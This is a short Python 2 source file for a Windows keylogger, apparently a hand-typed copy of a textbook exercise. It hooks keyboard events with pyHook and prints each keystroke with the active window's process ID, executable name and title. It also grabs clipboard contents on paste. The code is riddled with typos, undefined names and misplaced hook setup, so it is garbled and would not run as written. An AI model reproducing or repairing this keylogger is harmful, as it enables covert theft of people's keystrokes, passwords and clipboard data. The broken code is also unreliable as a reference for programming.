import pythoncom, pyHoot, win32clipboard
from ctypes import *

def banner():
	print "[***]	keylogger p112		[***]"

def get_current_process():
	hwnd = user32.GetForegroundWindow()
	pid = c_ulong(0)
	user32.GetWindowsThreadProcessID(hwnd, byref(pid))
	process_id = "%d" % pid.value
	executable = createstring_bufer("\x00" * 512)
	h_process = kernet32.OpenProcess(0x400 | 0x10, False, pid)
	psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
	window_title= create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_ttitl), 512)
	print ""
	print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
	print ""
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

def KeyStroke(event):
	global current_window
	if event.WindoName != current_window:
		current_window_ event.WindowName
		get_current_process()
	if event.Ascii > 32 and even.Ascii < 127:
		print chr(even.Ascii),
	else:
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clip[board.CloseClipbpard()
			print "[PASTE] - %s" % (pasted_value)
		else:
			print "[%s]" % event_key,
	return True
	kl = pyHook.HootManager()
	kl.KeyDown = KeyStroke
	kl.HookKeyboard()
	pythoncom.PumpMessages()
